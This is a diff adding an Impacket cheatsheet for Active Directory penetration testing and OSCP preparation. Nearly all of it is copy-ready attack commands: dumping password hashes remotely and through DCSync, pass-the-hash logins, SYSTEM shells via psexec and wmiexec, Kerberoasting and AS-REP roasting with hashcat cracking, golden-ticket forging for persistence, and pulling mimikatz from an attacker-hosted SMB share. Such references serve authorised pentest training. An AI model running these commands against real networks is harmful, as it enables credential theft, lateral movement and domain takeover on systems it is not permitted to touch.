@@ -1,0 +1,127 @@
+IMPACKET CHEATSHEET
+===================
+ 
+Impacket is a collection of Python tools for interacting with network protocols —
+primarily Windows/Active Directory protocols like SMB, LDAP, Kerberos, and RPC.
+It's essential for AD pentesting and OSCP.
+ 
+---
+ 
+secretsdump
+-----------
+Dumps password hashes from a remote machine or from offline files.
+ 
+# Remote dump via SMB (needs admin)
+impacket-secretsdump domain/user:password@<IP>
+ 
+# DCSync — dump specific user from DC
+impacket-secretsdump domain/user:password@<DC_IP> -just-dc-user Administrator
+ 
+# Offline from ntds.dit and SYSTEM hive
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+ 
+# Pass the hash
+impacket-secretsdump domain/user@<IP> -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM>
+ 
+---
+ 
+psexec
+------
+Gets a SYSTEM shell via SMB. Requires admin/writable ADMIN$ share.
+ 
+# Password
+impacket-psexec domain/user:password@<IP>
+ 
+# Pass the hash
+impacket-psexec domain/user@<IP> -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM>
+ 
+---
+ 
+wmiexec
+-------
+Gets a shell via WMI. Less noisy than psexec, runs as the user not SYSTEM.
+ 
+impacket-wmiexec domain/user:password@<IP>
+impacket-wmiexec domain/user@<IP> -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM>
+ 
+---
+ 
+smbclient
+---------
+Interacts with SMB shares — browse, upload, download files.
+ 
+# Connect
+impacket-smbclient domain/user:password@<IP>
+ 
+# Pass the hash
+impacket-smbclient domain/user@<IP> -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM>
+ 
+# Once connected
+shares        # list shares
+use C$        # connect to share
+ls            # list files
+get file.txt  # download file
+put file.txt  # upload file
+ 
+---
+ 
+GetUserSPNs — Kerberoasting
+----------------------------
+Requests service tickets for accounts with SPNs and saves for cracking.
+ 
+impacket-GetUserSPNs domain/user:password -dc-ip <DC_IP> -request -o kerberoast.txt
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+ 
+---
+ 
+GetNPUsers — AS-REP Roasting
+-----------------------------
+Gets hashes for users with Kerberos pre-auth disabled.
+ 
+impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip <DC_IP>
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+ 
+---
+ 
+GetADUsers
+----------
+Enumerates all domain users.
+ 
+impacket-GetADUsers -all domain/user:password -dc-ip <DC_IP>
+ 
+---
+ 
+ticketer — Golden/Silver Tickets
+---------------------------------
+Forges Kerberos tickets for persistence.
+ 
+# Golden ticket (needs krbtgt hash and domain SID)
+impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain <domain> Administrator
+ 
+# Use the ticket
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass domain/Administrator@<DC_hostname>
+ 
+---
+ 
+smbserver
+---------
+Hosts a quick SMB share from Kali — useful for transferring files.
+ 
+impacket-smbserver share /tmp/share -smb2support
+ 
+# On Windows target to pull a file
+copy \\<KALI_IP>\share\mimikatz.exe .
+ 
+# With auth (needed on newer Windows)
+impacket-smbserver share /tmp/share -smb2support -username user -password pass
+ 
+---
+ 
+QUICK REFERENCE — Pass the Hash
+---------------------------------
+The LM hash is always aad3b435b51404eeaad3b435b51404ee for empty — only the NTLM part changes.
+ 
+# Format for all impacket tools
+-hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
+ 
